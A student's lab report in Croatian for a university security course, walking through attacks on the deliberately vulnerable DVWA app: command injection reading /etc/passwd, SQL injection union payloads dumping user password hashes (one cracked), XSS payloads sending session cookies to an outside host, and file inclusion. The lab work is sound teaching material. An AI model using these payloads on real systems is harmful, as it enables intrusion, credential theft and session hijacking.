@@ -1,0 +1,111 @@
+SRS-LAB3
+Filip Ćelepirović
+0036529608
+
+Nakon logiranja u virtualni stroj (username-student, password-Internet1) provjeravam dodjeljene IP adrese u terminalu naredbom ip addr.
+Pokrećem docker instancu ranjivog web poslužitelja naredbom sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa.
+Na Internetu spajam se na ranjivi web poslužitelj na adresi http://127.0.0.1 i kao username upisujem admin, a kao password upisujem password gdje stvaram bazu.
+
+1.zadatak
+Napadi umetanjem mogući su kad aplikacija šalje ranjive podatke (npr. unos u formi), HTTP zaglavlja i sl. sistemskoj ljusci.
+U prozoru Command Injection upisujem 1 | echo sui i ispod dobivam ispis sui.
+To znači da se izvođenjem ove naredbe izvršila proizvoljna naredba koju smo unijeli nakon '1 |'.
+Zaključujem da nakon '1 |' mogu unijeti bilo koju naredbu za koju želim da se izvrši.
+U zadatku je zadano da trebam ispisati sadržaj datoteke /etc/passwd, za što je potrebna naredba cat i datoteka čiji sadržaj ispisujemo.
+Cijela naredba koju upisujem je 1 | cat /etc/passwd.
+Ispis koji dobivam glasi:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+
+2.zadatak
+Napadi SQL umetanjem predstavljaju veliku opasnost za aplikacije koje koriste povjerljive podatke koji mogu lako postati dostupni napadaču koji zna umetnuti SQL statement u svoj upit.
+U prozoru SQL injection unosimo naredbu 'or 1=1 union select first_name, last_name from users# i dobivamo ispis:
+ID: 'or 1=1 union select first_name, last_name from users#
+First name: admin
+Surname: admin
+ID: 'or 1=1 union select first_name, last_name from users#
+First name: Gordon
+Surname: Brown
+ID: 'or 1=1 union select first_name, last_name from users#
+First name: Hack
+Surname: Me
+ID: 'or 1=1 union select first_name, last_name from users#
+First name: Pablo
+Surname: Picasso
+ID: 'or 1=1 union select first_name, last_name from users#
+First name: Bob
+Surname: Smith
+
+Vidimo da postoji korisnik imena Pablo i prezimena Picasso, kojeg želimo napasti.
+Unosimo naredbu 'or 1=1 union select password, first_name from users# i dobivamo idući ispis:
+ID: 'or 1=1 union select password, first_name from users#
+First name: admin
+Surname: admin
+ID: 'or 1=1 union select password, first_name from users#
+First name: Gordon
+Surname: Brown
+ID: 'or 1=1 union select password, first_name from users#
+First name: Hack
+Surname: Me
+ID: 'or 1=1 union select password, first_name from users#
+First name: Pablo
+Surname: Picasso
+ID: 'or 1=1 union select password, first_name from users#
+First name: Bob
+Surname: Smith
+ID: 'or 1=1 union select password, first_name from users#
+First name: 5f4dcc3b5aa765d61d8327deb882cf99
+Surname: admin
+ID: 'or 1=1 union select password, first_name from users#
+First name: e99a18c428cb38d5f260853678922e03
+Surname: Gordon
+ID: 'or 1=1 union select password, first_name from users#
+First name: 8d3533d75ae2c3966d7e0d4fcc69216b
+Surname: Hack
+ID: 'or 1=1 union select password, first_name from users#
+First name: 0d107d09f5bbe40cade3de5c71e9e9b7
+Surname: Pablo
+ID: 'or 1=1 union select password, first_name from users#
+First name: 5f4dcc3b5aa765d61d8327deb882cf99
+Surname: Bob
+
+Primjećujemo da korisnik Pablo ima lozinku sa hashom 0d107d09f5bbe40cade3de5c71e9e9b7.
+Na stranici crackstation.net upisujemo hash 0d107d09f5bbe40cade3de5c71e9e9b7 i kao rezultat dobivamo lozinku letmein.
+
+
+3.zadatak
+U prozoru XSS Stored u dijelu Message unosim tekst <script>alert('test')</script>, a kao rezultat dobivamo 'test'.
+Zbog toga zaključujem kako mogu izvesti XSS napad.
+Unosim novi tekst <script>alert(document.cookie)</script>, a kao rezultat dobivam: PHPSESSID=8hln1bv1vko6vs3jhtf38sqsu3.
+Desnim klikom na formu s porukom kliknemo na Inspect Elements postavljamo ograničenje broja znakova sa 50 na 1000 da nam stane tekst iz idućeg dijela zadatka.
+Unosim tekst <script>document.location.href="http://public.tel.fer.hr/sui?cookie="+document.cookie</script> čime na adresu http://public.tel.fer.hr/sui predajemo kolačiće s pomoću zahtjeva GET.
+Kod XSS Reflected napada koristim naredbu <script>document.location.href="http://public.tel.fer.hr/srs?cookie=security=low;%20PHPSESSID=8hln1bv1vko6vs3jhtf38sqsu3";</script> koja se sada ne spremi u bazi, nego u URL-u. 
+URL kojim se ukrade kolačić je: http://public.tel.fer.hr/srs?cookie=PHPSESSID=8hln1bv1vko6vs3jhtf38sqsu3;%20security=low
+Od ovakvih ranjivosti aplikaciju bih zaštitio tako što bih upisivao javascript bez script taga, kodirao sve što unese korisnik, koristio POST umjesto GET-a i izbjegavao znakove <, >, {, }, " i ostale.
+
+
+
+4.zadatak
+U prozoru File Inclusion klikanjem na linkove file1.php, file2.php, file3.php vidim da se ime datoteke nalazi kao argument page u URL-u, na primjer http://127.0.0.1/vulnerabilities/fi/?page=file3.php.
+Zbog toga ćemo u URL unijeti ime datoteke čiji sadržaj želimo ispisati pa će URL izgledati http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
+Sadržaj datoteke /etc/passwd nalazi se u slika.png.
+Navedenu aplikaciju od ovakve vrste napada zaštitio bih tako što bih provodio validaciju ulaza, tj. ne izvršiti naredbu za svako ime koje korisnik unese, nego prvo provjeriti je li to ispravan ulaz i onda ako je izvršiti naredbu.
